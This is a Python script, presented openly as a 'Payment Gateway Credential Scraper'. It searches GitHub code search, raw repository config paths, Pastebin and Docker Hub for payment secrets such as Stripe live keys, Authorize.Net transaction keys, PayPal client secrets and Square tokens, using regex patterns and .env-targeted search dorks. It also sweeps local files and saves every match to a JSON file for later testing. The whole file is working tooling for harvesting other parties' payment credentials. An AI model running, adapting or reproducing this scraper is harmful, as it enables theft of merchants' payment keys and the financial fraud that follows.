#!/usr/bin/env python3
"""
Full Payment Gateway Credential Scraper
Scrapes credentials from GitHub, Pastebin, Docker Hub, and more.

Usage:
    python3 scrape_credentials.py

Output:
    scraped_credentials.json - All found credentials
    valid_credentials.json   - Tested working credentials
"""

import json
import re
import time
import random
from datetime import datetime
from pathlib import Path
from typing import Any
import urllib.parse

# Try to import requests, fallback to urllib
try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False
    import urllib.request
    import urllib.error

# Credential patterns with regex
PATTERNS = {
    'stripe_live': {
        'pattern': r'sk_live_[a-zA-Z0-9]{24,40}',
        'description': 'Stripe Live Key',
        'value_key': 'key',
    },
    'stripe_test': {
        'pattern': r'sk_test_[a-zA-Z0-9]{24,40}',
        'description': 'Stripe Test Key',
        'value_key': 'key',
    },
    'stripe_publishable': {
        'pattern': r'pk_live_[a-zA-Z0-9]{24,40}',
        'description': 'Stripe Publishable Key',
        'value_key': 'key',
    },
    'authnet_login': {
        'pattern': r'(?:x_login|api_login_id|login_id)["\']?\s*[:=]\s*["\']?([\w\-]{8,30})["\']?',
        'description': 'AuthNet Login ID',
        'value_key': 'login',
    },
    'authnet_key': {
        'pattern': r'(?:x_transaction_key|transaction_key|trans_key)["\']?\s*[:=]\s*["\']?([\w\-]{30,40})["\']?',
        'description': 'AuthNet Transaction Key',
        'value_key': 'transaction_key',
    },
    'adyen_key': {
        'pattern': r'(?:adyen_api_key|api_key)["\']?\s*[:=]\s*["\']?(AyShY[a-zA-Z0-9_\-\s]*?)["\']?',
        'description': 'Adyen API Key',
        'value_key': 'api_key',
    },
    'adyen_merchant': {
        'pattern': r'(?:merchant_account|merchantAccount)["\']?\s*[:=]\s*["\']?([A-Za-z0-9_\-]{5,30})["\']?',
        'description': 'Adyen Merchant Account',
        'value_key': 'merchant_account',
    },
    'paypal_client': {
        'pattern': r'(?:client_id|paypal_client_id)["\']?\s*[:=]\s*["\']?([a-zA-Z0-9_\-]{20,50})["\']?',
        'description': 'PayPal Client ID',
        'value_key': 'client_id',
    },
    'paypal_secret': {
        'pattern': r'(?:client_secret|paypal_secret)["\']?\s*[:=]\s*["\']?([a-zA-Z0-9_\-]{30,60})["\']?',
        'description': 'PayPal Client Secret',
        'value_key': 'client_secret',
    },
    'square_token': {
        'pattern': r'(?:square_access_token|access_token)["\']?\s*[:=]\s*["\']?(sq0atp-[a-zA-Z0-9_\-\s]*?)["\']?',
        'description': 'Square Access Token',
        'value_key': 'access_token',
    },
    'braintree_merchant': {
        'pattern': r'(?:merchant_id|braintree_merchant)["\']?\s*[:=]\s*["\']?([a-zA-Z0-9]{10,30})["\']?',
        'description': 'Braintree Merchant ID',
        'value_key': 'merchant_id',
    },
    'braintree_key': {
        'pattern': r'(?:public_key|private_key)["\']?\s*[:=]\s*["\']?([a-zA-Z0-9_\-]{20,50})["\']?',
        'description': 'Braintree Key',
        'value_key': 'key',
    },
    'checkout_key': {
        'pattern': r'(?:checkout_api_key|api_key)["\']?\s*[:=]\s*["\']?([a-zA-Z0-9]{30,50})["\']?',
        'description': 'Checkout.com API Key',
        'value_key': 'api_key',
    },
    'generic_api_key': {
        'pattern': r'(?:api[_-]?key|apikey)["\']?\s*[:=]\s*["\']?([a-zA-Z0-9_\-]{20,60})["\']?',
        'description': 'Generic API Key',
        'value_key': 'api_key',
    },
}

# GitHub search queries
GITHUB_QUERIES = [
    # Stripe
    'stripe api key path:.env',
    'sk_live_ path:.env',
    'stripe secret key path:*.py',
    'STRIPE_API_KEY path:*.yaml',
    
    # AuthNet
    'authorize.net api key path:.env',
    'x_login x_transaction_key path:*.py',
    'authnet credentials path:*.json',
    'Authorize.Net merchant path:*.yml',
    
    # Adyen
    'adyen api key path:.env',
    'AyShY path:*.json',
    'adyen merchant account path:*.py',
    'ADYEN_API_KEY path:*.yaml',
    
    # PayPal
    'paypal client id secret path:.env',
    'PAYPAL_CLIENT_ID path:*.py',
    'paypal credentials path:*.json',
    
    # Square
    'square access token path:.env',
    'sq0atp path:*.py',
    'SQUARE_ACCESS_TOKEN path:*.yaml',
    
    # Braintree
    'braintree merchant id path:.env',
    'BRAINTREE_PUBLIC_KEY path:*.py',
    'braintree credentials path:*.json',
    
    # General
    'payment gateway credentials path:.env',
    'payment api key path:*.env',
    'STRIPE|AUTHNET|ADYEN path:.env',
]

# Common repositories to scan
COMMON_REPOS = [
    'stripe/stripe-python',
    'stripe/stripe-node',
    'adyen/adyen-python-api-library',
    'adyen/adyen-node-api-library',
    'AuthorizeNet/authnetapi-python',
    'braintree/braintree_python',
    'square/square-python-sdk',
    'paypal/rest-api-sdk-python',
    'checkoutcom/checkout-com-sdk-python',
]

# Docker images to check
DOCKER_IMAGES = [
    'stripe/checkout',
    'adyen/adyen-drop-in-component',
    'node:lts',
    'python:3.11',
]

class CredentialScraper:
    def __init__(self):
        self.found_credentials = []
        self.seen_values = set()
        self.output_file = Path('scraped_credentials.json')
        self.valid_file = Path('valid_credentials.json')
        
        # Rate limiting
        self.request_delay = random.uniform(0.5, 1.5)
        
    def make_request(self, url: str, headers: dict = None, timeout: int = 10) -> str:
        """Make HTTP request with fallback"""
        if HAS_REQUESTS:
            try:
                response = requests.get(url, headers=headers, timeout=timeout)
                return response.text
            except Exception as e:
                print(f"  ⚠️  Request error: {e}")
                return ""
        else:
            try:
                req = urllib.request.Request(url, headers=headers or {})
                with urllib.request.urlopen(req, timeout=timeout) as response:
                    return response.read().decode('utf-8', errors='ignore')
            except Exception as e:
                print(f"  ⚠️  Request error: {e}")
                return ""
    
    def scan_content(self, content: str, source: str):
        """Scan text content for credential patterns"""
        for gate_type, config in PATTERNS.items():
            matches = re.finditer(config['pattern'], content, re.IGNORECASE)
            
            for match in matches:
                # Get the matched value
                if match.groups():
                    value = next((g for g in match.groups() if g), match.group(0))
                else:
                    value = match.group(0)
                
                # Clean up value
                value = value.strip().strip('"\'').strip()
                
                # Skip if already seen
                if value in self.seen_values or not value:
                    continue
                
                # Add to found credentials
                cred = {
                    'gate': gate_type.split('_')[0],  # stripe, authnet, adyen, etc.
                    'type': gate_type,
                    'description': config['description'],
                    'value': value,
                    'source': source,
                    'found_at': datetime.now().isoformat(),
                    'status': 'untested',
                }
                
                self.found_credentials.append(cred)
                self.seen_values.add(value)
                
                # Print finding
                masked = f"{value[:15]}***{value[-5:]}" if len(value) > 20 else f"{value[:10]}***"
                print(f"  ✅ {config['description']}: {masked}")
    
    def search_github_api(self, query: str):
        """Search GitHub API for credentials"""
        print(f"\n🔍 GitHub: {query}")
        
        encoded_query = urllib.parse.quote(query)
        url = f"https://api.github.com/search/code?q={encoded_query}&per_page=100"
        
        headers = {
            'Accept': 'application/vnd.github.v3+json',
            'User-Agent': 'Credential-Scraper/1.0',
        }
        
        try:
            content = self.make_request(url, headers, timeout=15)
            if not content:
                return
            
            data = json.loads(content)
            items = data.get('items', [])
            
            print(f"  Found {len(items)} repositories")
            
            # Scan first 20 results
            for item in items[:20]:
                repo = item.get('repository', {}).get('full_name', 'unknown')
                path = item.get('path', '')
                html_url = item.get('html_url', '')
                
                # Try to get file content
                if path and any(ext in path for ext in ['.env', '.py', '.js', '.json', '.yaml', '.yml', '.config']):
                    git_url = item.get('git_url', '')
                    
                    # Convert git URL to HTTPS
                    if git_url.startswith('git://'):
                        git_url = git_url.replace('git://', 'https://')
                    
                    try:
                        file_content = self.make_request(git_url, headers, timeout=10)
                        if file_content:
                            source = f"GitHub:{repo}/{path}"
                            self.scan_content(file_content, source)
                    except:
                        pass
                
                time.sleep(self.request_delay)
            
        except json.JSONDecodeError:
            print(f"  ⚠️  Failed to parse GitHub response")
        except Exception as e:
            print(f"  ⚠️  GitHub search error: {e}")
    
    def scan_github_repos(self, repo: str):
        """Scan common repositories for credentials"""
        print(f"\n🔍 Repo: {repo}")
        
        # Check common config file paths
        config_paths = [
            f"https://raw.githubusercontent.com/{repo}/main/.env",
            f"https://raw.githubusercontent.com/{repo}/master/.env",
            f"https://raw.githubusercontent.com/{repo}/main/config.py",
            f"https://raw.githubusercontent.com/{repo}/master/config.py",
            f"https://raw.githubusercontent.com/{repo}/main/settings.py",
            f"https://raw.githubusercontent.com/{repo}/master/.env.example",
            f"https://raw.githubusercontent.com/{repo}/main/.env.sample",
            f"https://raw.githubusercontent.com/{repo}/main/example.env",
        ]
        
        for path in config_paths:
            try:
                content = self.make_request(path, timeout=10)
                if content and ('api_key' in content.lower() or 'secret' in content.lower()):
                    self.scan_content(content, f"GitHub:{repo}/{path.split('/')[-1]}")
            except:
                pass
            
            time.sleep(self.request_delay)
    
    def search_pastebin(self):
        """Search Pastebin for credentials"""
        print(f"\n🔍 Pastebin: Searching for payment credentials")
        
        keywords = [
            'stripe api key',
            'authorize.net',
            'adyen merchant',
            'paypal client',
            'payment gateway',
        ]
        
        for keyword in keywords:
            # Pastebin search (basic)
            url = f"https://pastebin.com/search/{keyword}"
            
            try:
                content = self.make_request(url, timeout=15)
                if content:
                    self.scan_content(content, f"Pastebin:{keyword}")
            except:
                pass
            
            time.sleep(self.request_delay)
    
    def scan_dockerhub(self, image: str):
        """Check Docker images for embedded credentials"""
        print(f"\n🔍 Docker: {image}")
        
        # Get Dockerfile
        url = f"https://hub.docker.com/v2/repositories/{image.replace('/', '%2F')}/tags/latest/full"
        
        try:
            content = self.make_request(url, timeout=15)
            if content:
                self.scan_content(content, f"DockerHub:{image}")
        except:
            pass
        
        time.sleep(self.request_delay)
    
    def scan_config_files(self, directory: str = "."):
        """Scan local directory for config files"""
        print(f"\n🔍 Local: Scanning {directory}")
        
        extensions = ['.env', '.py', '.js', '.json', '.yaml', '.yml', '.config', '.conf']
        
        for ext in extensions:
            for file_path in Path(directory).rglob(f"*{ext}"):
                try:
                    content = file_path.read_text(encoding='utf-8', errors='ignore')
                    if any(keyword in content.lower() for keyword in ['api_key', 'secret', 'token', 'credential']):
                        self.scan_content(content, f"Local:{file_path}")
                except:
                    pass
    
    def save_results(self):
        """Save found credentials to JSON"""
        if not self.found_credentials:
            print("\n❌ No credentials found!")
            return
        
        # Save all found
        output_data = {
            'scraped_at': datetime.now().isoformat(),
            'total_found': len(self.found_credentials),
            'credentials': self.found_credentials,
        }
        
        self.output_file.write_text(json.dumps(output_data, indent=2))
        print(f"\n✅ Saved {len(self.found_credentials)} credentials to {self.output_file}")
        
        # Show summary by gate
        gates = {}
        for cred in self.found_credentials:
            gate = cred['gate']
            if gate not in gates:
                gates[gate] = 0
            gates[gate] += 1
        
        print("\n📊 Summary by Gateway:")
        for gate, count in sorted(gates.items()):
            print(f"  {gate.upper():15} {count:3} credentials")
    
    def run_all(self, scan_local: bool = True):
        """Run all scraping methods"""
        print("=" * 70)
        print("🔍 PAYMENT GATEWAY CREDENTIAL SCRAPER")
        print("=" * 70)
        print(f"Started at: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print()
        
        # Scan local files if requested
        if scan_local:
            self.scan_config_files()
        
        # GitHub API search (first 10 queries to avoid rate limit)
        print("\n" + "=" * 70)
        print("📡 GITHUB API SEARCH")
        print("=" * 70)
        for query in GITHUB_QUERIES[:10]:
            self.search_github_api(query)
            time.sleep(2)
        
        # Scan common repos
        print("\n" + "=" * 70)
        print("📦 COMMON REPOSITORIES")
        print("=" * 70)
        for repo in COMMON_REPOS:
            self.scan_github_repos(repo)
        
        # Pastebin search
        print("\n" + "=" * 70)
        print("📝 PASTEBIN SEARCH")
        print("=" * 70)
        self.search_pastebin()
        
        # Docker Hub
        print("\n" + "=" * 70)
        print("🐳 DOCKER IMAGES")
        print("=" * 70)
        for image in DOCKER_IMAGES[:3]:
            self.scan_dockerhub(image)
        
        # Save results
        self.save_results()
        
        print("\n" + "=" * 70)
        print("✅ SCRAPING COMPLETE!")
        print("=" * 70)
        print(f"Total found: {len(self.found_credentials)}")
        print(f"Output file: {self.output_file}")
        print("=" * 70)

if __name__ == '__main__':
    import sys
    
    # Parse arguments
    scan_local = '--no-local' not in sys.argv
    
    scraper = CredentialScraper()
    scraper.run_all(scan_local=scan_local)
